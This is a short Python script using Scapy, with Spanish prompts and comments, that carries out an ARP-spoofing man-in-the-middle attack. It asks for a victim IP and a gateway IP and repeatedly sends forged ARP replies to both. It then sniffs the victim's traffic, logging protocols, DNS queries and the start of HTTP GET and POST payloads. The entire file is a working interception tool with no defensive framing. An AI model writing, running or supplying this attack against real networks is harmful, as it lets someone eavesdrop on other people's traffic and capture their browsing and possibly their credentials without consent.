import time
from scapy.all import send, ARP, sniff, IP, TCP, UDP, DNS, DNSQR, Raw, ICMP

ip_victima = input("Ingrese la ip del objetivo en este formato x.x.x.x donde x es un numero del 0 - 255") 
ip_gateway = input("Ingrese la ip del Gateway en este formato x.x.x.x donde x es un numero del 0 - 255")

def spoof():
    send(ARP(op=2, pdst=ip_victima, psrc=ip_gateway), verbose=False)
    send(ARP(op=2, pdst=ip_gateway, psrc=ip_victima), verbose=False)

def packet_log(pkt):
    if IP in pkt:
        src = pkt[IP].src
        dst = pkt[IP].dst
        
        # Identificar el protocolo principal
        proto = "otro protocolo"
        if TCP in pkt: proto = "TCP"
        elif UDP in pkt: proto = "UDP"
        elif ICMP in pkt: proto = "ICMP"

        info = f"[*] {src} -> {dst} | {proto}"

        # Para ICMP
        if ICMP in pkt:
            tipo = pkt[ICMP].type
            # Tipo 8 es Echo Request (Ping), Tipo 0 es Echo Reply (Respuesta)
            msg = "Ping (Request)" if tipo == 8 else "Respuesta (Reply)" if tipo == 0 else f"Tipo {tipo}"
            info += f" | {msg}"

        # Para DNS
        elif pkt.haslayer(DNSQR):
            info += f" | DNS Query: {pkt[DNSQR].qname.decode()}"
        
        # Lógica para HTTP
        elif pkt.haslayer(Raw):
            load = pkt[Raw].load.decode('utf-8', errors='ignore')
            if "GET" in load or "POST" in load:
                info += f" | HTTP: {load[:50].strip()}..."

        print(info)

print("[!] Capturando... Ctrl+C para detener.")
try:
    while True:
        spoof()
        sniff(filter=f"host {ip_victima}", prn=packet_log, count=5, timeout=2, store=0)
except KeyboardInterrupt:
    print("\n[!] ....")
